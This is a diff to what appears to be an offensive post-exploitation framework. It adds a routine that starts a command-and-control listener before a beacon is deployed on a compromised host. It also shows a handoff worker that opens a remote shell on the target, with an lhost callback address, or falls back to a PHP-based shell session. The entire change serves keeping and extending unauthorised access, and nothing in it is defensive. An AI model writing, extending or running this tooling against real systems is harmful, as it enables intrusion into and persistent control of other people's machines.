@@ -362,10 +362,39 @@ def maybe_beacon_handoff(
         _mark_status(host, sessions_dir, "failed")
         return False
     log(
-        f"[handoff] foothold on {host}: deploying beacon and starting beacon_loop "
-        f"(live log: sessions/{_MARKER_PREFIX}{_sanitize_filename(host)}.log)"
+        f"[handoff] foothold on {host}: handoff worker started; "
+        f"beacon deploy result in sessions/{_MARKER_PREFIX}{_sanitize_filename(host)}.log"
     )
     return True
+
+
+def _ensure_c2_for_handoff(payload: dict, log: Callable[[str], None]) -> bool:
+    """Start the C2 before deploying a beacon that must check in.
+
+    Reuses the auto_loop autostart helper (single implementation) with
+    ``force=True``: a foothold handoff without a live C2 can never
+    receive its check-in, so the payload autostart flag is not allowed
+    to silently disable the listener here.
+
+    Args:
+        payload: Loaded payload mapping.
+        log: Line logger for the detached handoff log.
+
+    Returns:
+        True when the C2 endpoint is accepting connections.
+    """
+    try:
+        from modules.lazy_runner import _maybe_start_c2
+
+        alive = _maybe_start_c2(payload, force=True)
+    except Exception as exc:
+        log(f"[handoff] c2 preflight failed: {exc}")
+        return False
+    if alive:
+        log("[handoff] c2 reachable; deploying beacon")
+    else:
+        log("[handoff] c2 is not reachable and could not be started; aborting beacon deploy")
+    return bool(alive)
 
 
 def _php2shell_session_for(target: str, payload: dict | None = None):
@@ -432,6 +461,9 @@ def _handoff_worker(
             from modules.atomic_exploit_bridge import open_shell
 
             payload = _load_payload() or {}
+            if not _ensure_c2_for_handoff(payload, tlog):
+                _mark_status(target, sessions_dir, "failed")
+                return
             rce_session = None
             if open_shell(target, lhost=str(payload.get("lhost", "127.0.0.1") or "127.0.0.1")) is None:
                 rce_session = _php2shell_session_for(target, payload=payload)
